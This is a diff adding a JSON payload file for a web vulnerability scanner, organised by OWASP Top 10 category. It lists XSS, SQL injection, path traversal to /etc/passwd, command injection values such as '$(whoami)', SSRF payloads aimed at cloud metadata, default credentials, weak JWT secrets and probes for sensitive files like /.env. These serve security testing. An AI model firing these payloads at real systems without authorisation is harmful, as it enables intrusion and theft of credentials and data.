@@ -1,0 +1,106 @@
+{
+  "A01_Broken_Access_Control": {
+    "idor_params": ["user_id", "id", "uid", "account", "profile_id", "doc_id"],
+    "admin_paths": ["/admin", "/dashboard", "/config", "/panel", "/manage"],
+    "sensitive_paths": ["/.env", "/backup.zip", "/db.sql", "/config.php.bak"]
+  },
+  "A02_Cryptographic_Failures": {
+    "weak_ciphers": ["TLS_RSA_WITH_DES_CBC_SHA", "TLS_RSA_WITH_3DES_EDE_CBC_SHA"],
+    "test_paths": ["/", "/login", "/api"],
+    "headers_to_check": ["Strict-Transport-Security", "Content-Security-Policy"]
+  },
+  "A03_Injection": {
+    "xss": [
+      "<script>alert(1)</script>",
+      "\"><script>alert(1)</script>",
+      "javascript:alert(1)",
+      "<img src=x onerror=alert(1)>",
+      "'-alert(1)-'"
+    ],
+    "sqli": [
+      "' OR '1'='1",
+      "\" OR \"1\"=\"1",
+      "' UNION SELECT NULL--",
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' OR SLEEP(5)--",
+      "admin'--"
+    ],
+    "lfi": [
+      "../../../../etc/passwd",
+      "....//....//....//etc/passwd",
+      "/etc/passwd",
+      "....\\....\\....\\etc/passwd",
+      "php://filter/convert.base64-encode/resource=index.php"
+    ],
+    "rce": [
+      "; ls -la",
+      "| ls -la",
+      "`whoami`",
+      "$(whoami)"
+    ]
+  },
+  "A04_Insecure_Design": {
+    "debug_endpoints": ["/debug", "/console", "/actuator", "/swagger", "/api/docs", "/graphql", "/trace"],
+    "api_docs": ["/swagger.json", "/openapi.json", "/api-docs", "/redoc"],
+    "robot_keywords": ["admin", "backup", "config", "private", "secret"]
+  },
+  "A05_Security_Misconfiguration": {
+    "server_tokens": ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"],
+    "default_creds": [
+      {"url": "/admin", "user": "admin", "pass": "admin"},
+      {"url": "/admin", "user": "admin", "pass": "password"},
+      {"url": "/wp-login.php", "user": "admin", "pass": "admin"},
+      {"url": "/manager", "user": "admin", "pass": "admin"}
+    ]
+  },
+  "A06_Vulnerable_Components": {
+    "version_patterns": [
+      "Apache/([0-9.]+)",
+      "nginx/([0-9.]+)",
+      "PHP/([0-9.]+)",
+      "MySQL ([0-9.]+)",
+      "OpenSSH ([0-9.]+)",
+      "WordPress ([0-9.]+)",
+      "Django ([0-9.]+)",
+      "Flask/([0-9.]+)",
+      "Express/([0-9.]+)",
+      "Laravel/([0-9.]+)"
+    ]
+  },
+  "A07_Auth_Failures": {
+    "login_paths": ["/login", "/signin", "/auth", "/wp-login.php", "/admin/login", "/user/login"],
+    "default_creds": [
+      {"user": "admin", "pass": "admin"},
+      {"user": "admin", "pass": "password"},
+      {"user": "root", "pass": "root"},
+      {"user": "test", "pass": "test"},
+      {"user": "guest", "pass": "guest"}
+    ],
+    "session_checks": ["Set-Cookie", "HttpOnly", "Secure", "SameSite"]
+  },
+  "A08_Data_Integrity_Failures": {
+    "jwt_algorithms": ["none", "HS256", "RS256"],
+    "weak_secrets": ["secret", "password", "123456", "admin", "key", "test"],
+    "deserialization_indicators": ["ObjectInputStream", "readObject", "unserialize", "pickle"]
+  },
+  "A09_Logging_Failures": {
+    "error_keywords": ["stack trace", "traceback", "exception", "error in", "warning:", "debug mode"],
+    "missing_log_headers": ["Content-Security-Policy", "X-Content-Type-Options"]
+  },
+  "A10_SSRF": {
+    "payloads": [
+      "http://127.0.0.1:80",
+      "http://localhost:8080",
+      "http://169.254.169.254/latest/meta-data/",
+      "file:///etc/passwd",
+      "gopher://127.0.0.1:25",
+      "dict://127.0.0.1:11211",
+      "http://[::1]/",
+      "http://0.0.0.0:80",
+      "http://127.0.0.1:6379/",
+      "http://127.0.0.1:9200/_cluster/health"
+    ],
+    "internal_ips": ["127.0.0.1", "localhost", "0.0.0.0", "169.254.169.254", "[::1]"]
+  }
+}
